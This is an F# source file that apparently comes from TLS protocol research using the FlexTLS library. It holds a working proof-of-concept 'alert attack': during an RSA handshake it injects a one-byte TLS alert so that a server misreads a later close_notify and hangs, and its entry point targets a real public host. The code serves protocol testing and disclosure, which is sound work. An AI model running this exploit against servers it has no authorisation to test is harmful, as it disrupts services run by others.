module Attacks

open FlexTypes
open FlexConnection
open FlexClientHello
open FlexServerHello
open FlexAlert
open FlexState
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexRecord
open FlexAppData

open Bytes
open TLSInfo

let alertAttack peer name =
    // Connect to the server
    let st,cfg = FlexConnection.clientOpenTcpConnection(peer,name) in

    // Start a typical RSA handshake with the server
    let st,nsc,ch = FlexClientHello.send(st) in
    let st,nsc,sh = FlexServerHello.receive(st,nsc) in

    // *** Inject a one byte alert on behalf of the attacker ***
    let st = FlexAlert.send(st,Bytes.abytes [|1uy|]) in

    // Continue the typical RSA handshake
    let st,nsc,cert = FlexCertificate.receive(st,Client,nsc) in
    let st,shd      = FlexServerHelloDone.receive(st) in
    let st,nsc,cke  = FlexClientKeyExchange.sendRSA(st,nsc,ch) in
    let st,_        = FlexCCS.send(st) in
            
    // Start encrypting
    let st           = FlexState.installWriteKeys st nsc in
    let log          = ch.payload @| sh.payload @| cert.payload @| shd.payload @| cke.payload in
            
    let st,cf       = FlexFinished.send(st, logRoleNSC=(log,Client,nsc)) in
    let st,_        = FlexCCS.receive(st) in

    // Start decrypting
    let st           = FlexState.installReadKeys st nsc in
    // let log       = log @| fcf.payload

    // Check that verify_data is correct
    let st,fsf       = FlexFinished.receive(st) in

    // RSA handshake is over. Send some plaintext
    let request = sprintf "GET / HTTP/1.1\r\nConnection: Keep-Alive\r\n\r\n" in
    let st = FlexAppData.send(st,request) in
    printf "---> %s" request;
    let st,b = FlexAppData.receive(st) in
    let response = System.Text.Encoding.ASCII.GetString(cbytes b) in
    printf "<--- %s" response;
    let st,b = FlexAppData.receive(st) in
    let response = System.Text.Encoding.ASCII.GetString(cbytes b) in
    printf "<--- %s" response;

    // Close a connection by sending a close_notify alert
    let st = FlexAlert.send(st,TLSError.AD_close_notify) in

    (* *** Here we'd expect either a close_notify from the peer,
           or the connection to be shut down.
           However, the peer mis-interpreted our alert, and is now
           waiting for more data. *)
    printf "Sending close notify. Going to hang...\n"
    let st,ad = FlexAlert.receive(st) in
    printf "Alert: %A" ad;
    ignore (System.Console.ReadLine());
    ()

[<EntryPoint>]
let main argv = 
    alertAttack "www.inria.fr" "www.inria.fr"
    0